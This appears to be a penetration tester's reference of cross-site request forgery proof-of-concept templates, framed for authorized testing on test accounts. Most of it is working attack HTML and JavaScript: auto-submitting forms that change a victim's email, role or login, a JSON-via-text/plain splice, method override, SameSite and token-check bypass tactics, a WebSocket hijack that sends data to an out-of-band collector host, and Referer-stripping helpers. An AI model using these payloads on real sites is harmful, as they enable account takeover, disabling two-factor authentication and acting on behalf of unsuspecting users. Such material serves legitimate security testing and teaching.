# CSRF PoC templates (step 4)
# Serve from an attacker origin; load in a browser carrying the victim's cookies (test account).
# Record which template + whether the change fired in poc/<id>/.

## Auto-submitting form (classic; works for simple content types)
```html
<form action="https://TARGET/account/email" method="POST" id="f">
  <input type="hidden" name="email" value="attacker@evil.example">
</form>
<script>document.getElementById('f').submit()</script>
```

## multipart/form-data
```html
<form action="https://TARGET/upload" method="POST" enctype="multipart/form-data" id="f">
  <input type="hidden" name="role" value="admin">
</form><script>f.submit()</script>
```

## fetch with credentials (only if the endpoint accepts a simple/again CORS-permitted request)
```html
<script>
fetch('https://TARGET/api/settings', {
  method:'POST', credentials:'include',
  headers:{'Content-Type':'text/plain'},          // simple header to avoid preflight
  body:'{"twofa":false}'
});
</script>
```
Note: if the endpoint requires `application/json` AND validates it, a cross-origin page triggers a
CORS preflight it can't satisfy → that content-type requirement is itself a CSRF defense (verify.md).

## GET-based (sensitive state change via GET)
```html
<img src="https://TARGET/account/delete?confirm=1">
```

Use a benign/reversible change on a TEST account. Capture the response/'state changed' evidence.

---

## Extended arsenal — CSRF (cross-site request forgery)
# Placeholders: TARGET = victim app/HOST, ATTACKER = attacker-controlled origin (e.g. attacker.example),
# OOB / TOKEN.oob.example = out-of-band collector. Every PoC: TEST account, benign/reversible change,
# screenshot before/after state + the request in DevTools. Scope + written approval required.
# Dedup: the classic auto-submit POST form + simple multipart + fetch-with-creds live above; this section
# extends breadth (verbs, body shapes, SameSite, token flaws, login/logout, WebSocket, chaining).

### Content-type / body-shape decision table (what fires cross-origin without a preflight)
# Only 3 content types are "simple" (no preflight): application/x-www-form-urlencoded, multipart/form-data,
# text/plain. A form can emit exactly these — so a form reaches any endpoint that accepts one of them.
| Body needed on the wire | Technique | Preflight? |
|---|---|---|
| `a=1&b=2` (urlencoded) | normal `<form>` (default enctype) | no |
| `{"a":1,"b":2}` exact JSON | `text/plain` name/value splice (below) | no |
| `{"a":1}` + server ignores trailing junk | `enctype=text/plain`, one field | no |
| multipart fields / file upload | `enctype=multipart/form-data` form | no |
| strict `application/json` AND server validates the CT | NOT reachable by a pure HTML form → the CT check IS the defense | would preflight |

### Auto-submitting GET form (state change via GET)
```html
<!-- When the sensitive action is reachable by GET params (worse: survives SameSite=Lax top-level nav). -->
<form action="https://TARGET/account/transfer" method="GET" id="f">
  <input type="hidden" name="to" value="attacker-test-acct">
  <input type="hidden" name="amount" value="1">
</form>
<script>f.submit()</script>
```

### JSON body from an HTML form (text/plain splice — no preflight)
```html
<!-- Body on the wire: {"email":"attacker-test@oob.example","pad":"=x"}  — the field NAME carries the opening
     JSON, the field VALUE carries the closing quote+brace. Server must tolerate the trailing "pad" pair. -->
<form action="https://TARGET/api/profile" method="POST" enctype="text/plain" id="f">
  <input name='{"email":"attacker-test@oob.example","pad":"' value='"}'>
</form>
<script>f.submit()</script>
```
```html
<!-- Single-field variant when the JSON parser ignores junk after a valid object: body = {"twofa":false}= -->
<form action="https://TARGET/api/settings" method="POST" enctype="text/plain" id="f">
  <input name='{"twofa":false}' value=''>
</form><script>f.submit()</script>
```

### Method override (tunnel PUT/PATCH/DELETE through a form POST/GET)
```html
<!-- Frameworks honouring _method / X-HTTP-Method-Override let a form reach verbs <form> can't emit natively. -->
<form action="https://TARGET/api/users/TESTID?_method=DELETE" method="POST" id="f">
  <input type="hidden" name="_method" value="DELETE">
</form><script>f.submit()</script>
```
```
# Override vectors to try: body field _method / _HttpMethod, query ?_method=, and (XHR/fetch only, if the
# header is a simple one or CORS is permissive) X-HTTP-Method-Override: PUT.
```

### XHR / fetch variants (fire-and-forget, response ignored)
```html
<script>
// no-cors POST: the response is opaque (unreadable) but the state change still happens with cookies.
fetch('https://TARGET/account/email', {
  method:'POST', mode:'no-cors', credentials:'include',
  headers:{'Content-Type':'application/x-www-form-urlencoded'},
  body:'email=attacker-test@oob.example'
});
</script>
```
```html
<script>
var x=new XMLHttpRequest();
x.open('POST','https://TARGET/api/settings',true);
x.withCredentials=true;                               // send cookies
x.setRequestHeader('Content-Type','text/plain');     // simple header → no preflight
x.send('{"twofa":false}');
</script>
```

### SameSite-cookie bypass considerations (why a token-less endpoint can still be CSRF-able)
| Cookie posture | Still exploitable when… |
|---|---|
| `SameSite=Lax` (or browser default) | action is a **GET** state-change, OR reachable by **top-level navigation** (form POST navigations are sent on some engines within a short post-set window) |
| `SameSite=Lax`, POST-only | pair with an **open redirect / 307 on TARGET** so the cross-site POST becomes a same-site-looking top-level nav; or a **GET alias** of the action |
| any SameSite | request originates from a **sibling/sub-domain** of TARGET (same registrable domain → "same-site") — chain a subdomain XSS / takeover / less-trusted vhost |
| `SameSite=Strict` | a **sub-domain or on-site sink** (stored content, less-strict endpoint) issues the request; or the cookie is also mirrored into a non-Strict cookie |
| `SameSite=None; Secure` | no SameSite protection at all → classic cross-site CSRF applies |
```
# Top-level-nav delivery (counts as navigation, carries Lax cookies): auto-submit form (above) or:
#   <script>location='https://TARGET/account/delete?confirm=1'</script>   # GET state-change
```

### Token-handling flaw test matrix (anti-CSRF present but weak)
| Flaw | Test (benign, TEST account) | Confirmed when |
|---|---|---|
| Token not validated | remove the token param entirely, replay | action succeeds without it |
| Presence-only check | send `csrf=` (empty) or `csrf=x` | any/empty value accepted |
| Static / app-wide token | reuse one captured token across sessions/users | B's token works for A |
| Token not bound to session | mint token as attacker-test acct, use in victim-test session | cross-session token accepted |
| Reflected/echoed token | server reflects a client-supplied token and then "validates" it | attacker-set token == expected |
| Double-submit cookie weak | set the pair from a sibling/sub-domain or predict it | attacker-chosen cookie+body pair accepted |
| Method-gated token | token enforced on POST but not on GET/PUT alias | verb swap bypasses it |
| Predictable token | low entropy / sequential / time-seeded | next value guessable (see crypto-attacks refs) |
```html
<!-- Reflected double-submit: attacker fixes BOTH halves from a page they control on a sibling origin. -->
<form action="https://TARGET/account/email" method="POST" id="f">
  <input type="hidden" name="csrf" value="attacker-fixed-value">   <!-- must equal the attacker-set cookie -->
  <input type="hidden" name="email" value="attacker-test@oob.example">
</form><script>f.submit()</script>
```

### Login CSRF (force the victim into an ATTACKER-controlled TEST account)
```html
<!-- Victim is silently logged into the attacker's TEST account → their later activity lands in it. Benign
     proof: show the session now belongs to the attacker-test identity (e.g. username shown in the UI). -->
<form action="https://TARGET/login" method="POST" id="f">
  <input type="hidden" name="username" value="attacker-test-user">
  <input type="hidden" name="password" value="attacker-test-pass">
</form><script>f.submit()</script>
```

### Logout CSRF
```html
<!-- Denial-of-session / precursor to a login-CSRF swap. Benign + obviously reversible. -->
<img src="https://TARGET/logout" alt="">
```

### Clickjacking-assisted CSRF (token present but page is frameable)
```
# When a valid token is embedded in the real page (so you can't forge it blind) BUT the page is frameable:
# frame the genuine form and UI-redress the victim into submitting it with its own live token.
#   → see the clickjacking skill refs (framing_poc.md) for the overlay PoC; this is CSRF with a real token.
```

### Cross-site WebSocket hijacking (CSWSH — CSRF for the WS handshake)
```html
<!-- WebSocket handshakes carry cookies and have NO SameSite/CSRF protection of their own. If the server
     doesn't check Origin, an attacker page opens an authenticated socket and reads/sends on the victim's
     behalf. Benign: open the socket, send one read-only/echo frame, show it was accepted. -->
<script>
var ws=new WebSocket('wss://TARGET/ws');            // cookies auto-attached by the browser
ws.onopen=()=>ws.send('{"action":"whoami"}');       // benign read; prove the authed socket opened
ws.onmessage=e=>fetch('//TOKEN.oob.example/?len='+e.data.length);   // exfil only a benign length marker
</script>
```

### Referer/Origin-check bypass helpers
```html
<!-- If TARGET only soft-checks Referer: suppress it so a "require same-origin referer" check sees none.
     (Absent Referer is often allowed.) -->
<meta name="referrer" content="no-referrer">
<!-- Or downgrade to origin-only / strip via rel on the navigating element: -->
<a href="https://TARGET/action?x=1" rel="noreferrer">go</a>
```
```
# Origin-header checks are stronger than Referer (Origin is sent on cross-site POST and can't be stripped by
# the attacker page). A server that trusts Referer-absent, or substring-matches TARGET inside Referer
# (e.g. https://TARGET.attacker.example), is bypassable — test both like the CORS origin matrix.
```

### GraphQL CSRF
```html
<!-- GraphQL over a GET query param, or a POST that accepts a simple content type, is CSRF-able. -->
<img src="https://TARGET/graphql?query=mutation{disableTwofa}">
```
```html
<form action="https://TARGET/graphql" method="POST" enctype="text/plain" id="f">
  <input name='{"query":"mutation{updateEmail(v:\"attacker-test@oob.example\")}"}' value=''>
</form><script>f.submit()</script>
```

### Benign evidence harness (what to capture per PoC)
```
# poc/<id>/:
#   template.html            - the exact PoC served
#   request.http             - the cross-origin request (method, CT, cookies attached, token state)
#   before.png / after.png   - TEST-account state proving the benign change fired
#   notes.md                 - which SameSite/token condition made it work; reversal step performed
# Severity hinges on the action: account-takeover-class (email/password/2FA/role change) > data mutation >
# nuisance (logout). Always revert the TEST change and record the revert.
```
